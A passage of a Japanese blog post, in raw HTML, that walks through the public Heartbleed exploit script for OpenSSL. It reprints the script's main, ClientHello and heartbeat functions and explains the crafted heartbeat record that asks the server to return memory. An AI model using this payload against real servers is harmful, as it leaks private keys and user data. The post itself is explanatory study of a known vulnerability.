href=\"#heartbleed-%E3%81%AE%E6%94%BB%E6%92%83%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E8%AA%AD%E3%82%80\" aria-label=\"heartbleed の攻撃コードを読む permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Heartbleed の攻撃コードを読む</h2>\n<p>公開されている攻撃コードを参考に、実際の悪用方法について理解していきたいと思います。</p>\n<p>攻撃コードは<a href=\"https://www.exploit-db.com/exploits/32764\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">exploit-db.com/exploits/32764</a>を参考にしました。</p>\n<p>コードの全体は貼りませんので、適宜上記のページを参照ください。</p>\n<h3 id=\"main関数\" style=\"position:relative;\"><a href=\"#main%E9%96%A2%E6%95%B0\" aria-label=\"main関数 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main関数</h3>\n<p>まずはmain関数部分を読んで、攻撃の流れを把握してみようと思います。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 1. 引数の受け取り</span>\n\topts<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> options<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n\t\toptions<span class=\"token punctuation\">.</span>print_help<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n    \n    <span class=\"token comment\"># 2. 各バージョンごとにコネクションを確立し、create_hello関数を実行</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Trying '</span> <span class=\"token operator\">+</span> version<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'...'</span>\n\t\ts <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Connecting...'</span>\n\t\tsys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\ts<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> opts<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Sending Client Hello...'</span>\n\t\tsys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\ts<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>create_hello<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Waiting for Server Hello...'</span>\n\t\tsys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token comment\"># 3．なんやかんや応答チェック</span>\n\t\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n\t\t\ttyp<span class=\"token punctuation\">,</span> ver<span class=\"token punctuation\">,</span> pay <span class=\"token operator\">=</span> recvmsg<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">if</span> typ <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Server closed connection without sending Server Hello.'</span>\n\t\t\t\t<span class=\"token keyword\">return</span>\n\t\t\t<span class=\"token comment\"># Look for server hello done message.</span>\n\t\t\t<span class=\"token keyword\">if</span> typ <span class=\"token operator\">==</span> <span class=\"token number\">22</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token keyword\">break</span>\n                \n\t\t<span class=\"token comment\"># 4. exploitの送信</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Sending heartbeat request...'</span>\n\t\tsys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\ts<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>create_hb<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> hit_hb<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span>create_hb<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token comment\">#Stop if vulnerable</span>\n\t\t\t<span class=\"token keyword\">break</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n\tmain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h4 id=\"1引数の受け取り\" style=\"position:relative;\"><a href=\"#1%E5%BC%95%E6%95%B0%E3%81%AE%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8A\" aria-label=\"1引数の受け取り permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1．引数の受け取り</h4>\n<p>引数なしの実行はできないようです。\n引数には、攻撃先のIPを指定する必要があります。</p>\n<h4 id=\"2各バージョンごとにコネクションを確立しcreate_hello関数を実行\" style=\"position:relative;\"><a href=\"#2%E5%90%84%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%81%94%E3%81%A8%E3%81%AB%E3%82%B3%E3%83%8D%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E7%A2%BA%E7%AB%8B%E3%81%97create_hello%E9%96%A2%E6%95%B0%E3%82%92%E5%AE%9F%E8%A1%8C\" aria-label=\"2各バージョンごとにコネクションを確立しcreate_hello関数を実行 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2．各バージョンごとにコネクションを確立し、create_hello関数を実行</h4>\n<p>あらかじめ定義されているバージョンリストのそれぞれで<code class=\"language-text\">create_hello(version)</code>を実行しているようです。\n<code class=\"language-text\">create_hello(version)</code>については<a href=\"#create_hello%E9%96%A2%E6%95%B0\">後述</a>します。</p>\n<h4 id=\"3なんやかんや応答チェック\" style=\"position:relative;\"><a href=\"#3%E3%81%AA%E3%82%93%E3%82%84%E3%81%8B%E3%82%93%E3%82%84%E5%BF%9C%E7%AD%94%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF\" aria-label=\"3なんやかんや応答チェック permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3．なんやかんや応答チェック</h4>\n<p><code class=\"language-text\">recvmsg(s)</code> の中のそれぞれの値が、<code class=\"language-text\">typ == 22 and ord(pay[0]) == 0x0E</code>であればServerHelloを受信したものとして、ペイロードの送信に進みます。</p>\n<p><code class=\"language-text\">recvmsg(s)</code> についても<a href=\"#recvmsg%E9%96%A2%E6%95%B0\">後述</a>します。</p>\n<h4 id=\"4-exploitの送信\" style=\"position:relative;\"><a href=\"#4-exploit%E3%81%AE%E9%80%81%E4%BF%A1\" aria-label=\"4 exploitの送信 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4. exploitの送信</h4>\n<p>コネクションが確認できたら、<code class=\"language-text\">create_hb(version[i][1])</code>で攻撃パケットを送り込み、応答パケットの情報を表示します。</p>\n<p><code class=\"language-text\">create_hb(version[i][1])</code>についても<a href=\"#create_hb%E9%96%A2%E6%95%B0\">後述</a>します。</p>\n<h3 id=\"create_hello関数\" style=\"position:relative;\"><a href=\"#create_hello%E9%96%A2%E6%95%B0\" aria-label=\"create_hello関数 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>create_hello関数</h3>\n<p>では、各関数の処理を見てみます。</p>\n<p>最初はcreate_hello関数です。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">h2bin</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">return</span> x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">create_hello</span><span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\thello <span class=\"token operator\">=</span> h2bin<span class=\"token punctuation\">(</span><span class=\"token string\">'16 '</span> <span class=\"token operator\">+</span> version <span class=\"token operator\">+</span> <span class=\"token string\">' 00 dc 01 00 00 d8 '</span> <span class=\"token operator\">+</span> version <span class=\"token operator\">+</span> <span class=\"token triple-quoted-string string\">''' 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\nc0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n00 0f 00 01 01\n'''</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> hello</code></pre></div>\n<p>最終的に戻り値<code class=\"language-text\">hello</code>として返しているのは、以下のバイトコードをdecodeしたものでした。</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">16 03 00 00 dc 01 00 00 d8 03 00 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\nc0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n00 0f 00 01 01</code></pre></div>\n<p>これは、ClientHelloに使用するパケットデータを生成しています。\nClientHelloは、新規のハンドシェイク時に必ず最初に送信されるデータです。</p>\n<p>そもそも、<strong>SSLのデータ（レコード）は、5バイトのレコードヘッダとそれに続くデータ</strong>で構成されます。\n参考：<a href=\"https://www.cisco.com/c/en/us/support/docs/security-vpn/secure-socket-layer-ssl/116181-technote-product-00.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SSL Introduction with Sample Transaction and Packet Exchange - Cisco</a></p>\n<p>上記のデータでは、<code class=\"language-text\">16 03 00 00 dc</code>がレコードヘッダです。\n先頭の0x16は、<code class=\"language-text\">Type</code>が<code class=\"language-text\">Handshake (22, 0x16)</code>であることを示します。</p>\n<p>次に、<code class=\"language-text\">version</code>として挿入している2バイトは、<code class=\"language-text\">Record Version</code>を指します。\n<code class=\"language-text\">03 00</code>が指定されているので、<code class=\"language-text\">SSL Version 3 (SSLv3)</code>と解釈されます。</p>\n<p>そして最後の2バイトが<code class=\"language-text\">Length</code>で、レコードのサイズを指定しています。</p>\n<p>データ部に関しては、ClientHelloが送信する次のような情報が含まれているはずです。</p>\n<ol>\n<li>Version：クライアントがサポートする最良のバージョンです</li>\n<li>Random：32バイトで構成され、4バイトに時刻、28バイトにランダムに生成されたデータが保存されます</li>\n<li>SessionID：ClientHelloの場合は、SessionIDは空です</li>\n<li>Chiper Suites：クライアントが対応可能な暗号スイートが格納されます</li>\n<li>Conpression Methods：クライアントが対応している圧縮方法が指定されます</li>\n<li>Extentions：付加的なデータのための拡張が指定されます</li>\n</ol>\n<h3 id=\"recvmsg関数\" style=\"position:relative;\"><a href=\"#recvmsg%E9%96%A2%E6%95%B0\" aria-label=\"recvmsg関数 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>recvmsg関数</h3>\n<p>生成したClientHelloを送り付けたので、ServerHelloが返却されてきます。</p>\n<p><code class=\"language-text\">recvmsg(s)</code>は、この情報を取得しています。\nこの関数によって、次のような情報が表示されました。</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Waiting for Server Hello...\n ... received message: type = 22, ver = 0301, length = 66\n ... received message: type = 22, ver = 0301, length = 885\n ... received message: type = 22, ver = 0301, length = 331\n ... received message: type = 22, ver = 0301, length = 4</code></pre></div>\n<p>ServerHelloの構造は、ClientHelloと同じです。\nレコードヘッダ部から、ハンドシェイクのTypeとSSLのバージョン、データ長を取得しています。</p>\n<p>しかし、ServerHelloの構造は、ClientHelloと同じですが、そのデータ部には、サーバ側で決定された情報が追加されます。（SessionIDなど）</p>\n<p>なお、ClientHelloでは、SSLのバージョンについて<code class=\"language-text\">03 00</code>を指定して送信していましたが、ServerHelloでは<code class=\"language-text\">03 01</code>が返ってきています。</p>\n<p>これは、<strong>サーバ側は必ずしもクライアントと同じバージョンに対応している必要はない</strong>ためです。\nサーバ側は、クライアント側が自信のバージョンに対応してくれることを期待し、応答を返します。</p>\n<p>これでコネクションが確立できることが分かったのですが、今回はSSLハンドシェイクを構築する必要はないので、データ部の中にServerHelloの完了を示す情報が確認されたタイミングでbreakしていますね。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># Look for server hello done message.</span>\n\t<span class=\"token keyword\">if</span> typ <span class=\"token operator\">==</span> <span class=\"token number\">22</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">break</span></code></pre></div>\n<p>SSL接続が可能なことが確認されたため、最後はいよいよ攻撃性のハートビートパケットを送信してデータを抜き出します。</p>\n<h3 id=\"create_hb関数\" style=\"position:relative;\"><a href=\"#create_hb%E9%96%A2%E6%95%B0\" aria-label=\"create_hb関数 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>create_hb関数</h3>\n<p>最後は攻撃パケットを送信する部分です。\n応答を確認しているhit_hb関数も一緒に見ていきます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">create_hb</span><span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\thb <span class=\"token operator\">=</span> h2bin<span class=\"token punctuation\">(</span><span class=\"token string\">'18 '</span> <span class=\"token operator\">+</span> version <span class=\"token operator\">+</span> <span class=\"token string\">' 00 03 01 40 00'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> hb\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hit_hb</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span>hb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\ts<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>hb<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n\t\ttyp<span class=\"token punctuation\">,</span> ver<span class=\"token punctuation\">,</span> pay <span class=\"token operator\">=</span> recvmsg<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> typ <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'No heartbeat response received, server likely not vulnerable'</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n\t\t<span class=\"token keyword\">if</span> typ <span class=\"token operator\">==</span> <span class=\"token number\">24</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Received heartbeat response:'</span>\n\t\t\thexdump<span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'WARNING: server returned more data than it should - server is vulnerable!'</span>\n\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Server processed malformed heartbeat, but did not return any extra data.'</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n\n\t\t<span class=\"token keyword\">if</span> typ <span class=\"token operator\">==</span> <span class=\"token number\">21</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Received alert:'</span>\n\t\t\thexdump<span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Server returned error, likely not vulnerable'</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        \n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ・・・\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">'Sending heartbeat request...'</span>\n\t\tsys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\ts<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>create_hb<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> hit_hb<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span>create_hb<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token comment\">#Stop if vulnerable</span>\n\t\t\t<span class=\"token keyword\">break</span></code></pre></div>\n<p><code class=\"language-text\">s.send(create_hb(version[i][1]))</code>では、生成したハートビートのバイト列を送り付けてますね。</p>\n<p>送り付けているのは、<code class=\"language-text\">18 03 00 00 03 01 40 00</code>というバイト列です。\n内容としては、先のレコードヘッダとほぼ同じ構造です。</p>\n<p>先頭の<code class=\"language-text\">18</code>がheartbeat拡張であることを示し、<code class=\"language-text\">03 00</code>がSSL 3.0プロトコルを使用することを伝えます。</p>\n<p><code class=\"language-text\">00 03</code>は、以降のデータペイロードが3バイトであることを意味します。\n最後の<code class=\"language-text\">01 40 00</code>は、<a href=\"#OpenSSL%E3%81%AE%E5%95%8F%E9%A1%8C%E3%81%AE%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E8%AA%AD%E3%82%93%E3%81%A7%E3%81%BF%E3%82%8B\">OpenSSLの問題のコードを読んでみる</a>で説明した、HeartbeatのTypeとペイロード長です。</p>\n<p>先頭の1バイトが<code class=\"language-text\">01</code>なので、ハートビート要求パケットとなります。\nまた、後半2バイトが<code class=\"language-text\">04 